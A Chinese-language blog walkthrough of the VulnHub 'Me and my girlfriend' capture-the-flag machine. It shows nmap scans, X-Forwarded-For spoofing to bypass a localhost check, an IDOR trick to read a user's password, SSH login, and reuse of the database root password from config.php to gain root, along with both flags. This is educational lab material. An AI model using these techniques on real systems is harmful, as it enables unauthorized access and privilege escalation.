---
title: 靶机日记 二 | Me and my girlfriend
top: 10
categories:
  - Technical
tags:
  - Crack
date: 2020-08-21 17:09:46
---

This vuln target have an interesting  Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your help to get what Alice is hiding and get full access to the company!

靶机地址:https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

<!-- more -->

扫描主机

```zsh
Princeling-Mac at ~ ❯ nmap -T5 -sP  192.168.56.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 17:38 CST
Nmap scan report for promote.cache-dns.local (192.168.56.1)
Host is up (0.00073s latency).
Nmap scan report for promote.cache-dns.local (192.168.56.100)
Host is up (0.00033s latency).
Nmap scan report for promote.cache-dns.local (192.168.56.102)
Host is up (0.00050s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.84 seconds
Princeling-Mac at ~ ❯ nmap -p- 192.168.56.102
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 17:48 CST
Nmap scan report for promote.cache-dns.local (192.168.56.102)
Host is up (0.0034s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80端口应该是我们的突破点

![](http://leiblog.wang/static/image/2020/8/aCU1e1.png)

nikto扫描了一下、发现了几个php文件，但没头绪，机智的我打开了网页源代码。

```html
Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<!-- Maybe you can search how to use x-forwarded-for -->
```

看来要用`x-forward-for`进行一个本地的代理，我使用的是chrome的插件`x-forward-for`:

![](http://leiblog.wang/static/image/2020/8/jaFl0Z.png)

![](http://leiblog.wang/static/image/2020/8/9nTtDT.png)

Done。

尝试使用sql注入、失败。但是他提供了register，那我就先注册了一个用户，再登陆。

登陆进入之后、尝试了再Name处XSS攻击、失败。。

最后抓包的时候发现其发送了get请求、http://192.168.56.102/index.php?page=profile&user_id=12

把user_id换成别的

![](http://leiblog.wang/static/image/2020/8/00p4J4.png)

果然、user_id=5的时候出现了故事的主人公alice！

![](http://leiblog.wang/static/image/2020/8/mvD472.png)

把input控件的type换成text、就能拿到alice的密码了。

然后ssh、果然登陆进去了。然而我什么都没发现、home下面都空空如也，~~我还以为有什么出轨的信息呢！~~ 😳，居然在隐藏文件里！

```zsh
alice@gfriEND:~$ ls -al
total 32
drwxr-xr-x 4 alice alice 4096 Dec 13  2019 .
drwxr-xr-x 6 root  root  4096 Dec 13  2019 ..
-rw------- 1 alice alice   10 Dec 13  2019 .bash_history
-rw-r--r-- 1 alice alice  220 Dec 13  2019 .bash_logout
-rw-r--r-- 1 alice alice 3637 Dec 13  2019 .bashrc
drwx------ 2 alice alice 4096 Dec 13  2019 .cache
drwxrwxr-x 2 alice alice 4096 Dec 13  2019 .my_secret
-rw-r--r-- 1 alice alice  675 Dec 13  2019 .profile
alice@gfriEND:~$ cd .my_secret/
alice@gfriEND:~/.my_secret$ ls
flag1.txt  my_notes.txt
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
alice@gfriEND:~/.my_secret$ cat my_notes.txt
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
```

😂，原来是Alice不要Bob了！！最后一个问题，flag是什么，这需要我们拿到root权限。

首先，去apache的根目录下找到刚才扫描出来的php文件、查看config.php的内容，是连接数据库的、用他提供的root用户密码试了一下，还真进去了。

```zsh
alice@gfriEND:~/.my_secret$ cd /var/www/html/
alice@gfriEND:/var/www/html$ ls
config  halamanPerusahaan  heyhoo.txt  index.php  misc  robots.txt
alice@gfriEND:/var/www/html$ cd config/
alice@gfriEND:/var/www/html/config$ ls
config.php
alice@gfriEND:/var/www/html/config$ cat config.php
<?php

    $conn = mysqli_connect('localhost', 'root', 'ctf_pasti_bisa', 'ceban_corp');
alice@gfriEND:/var/www/html/config$ su
Password:
root@gfriEND:/var/www/html/config#
```

root的home目录下，发现了隐藏的flag2.txt

```zsh
root@gfriEND:~# cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```

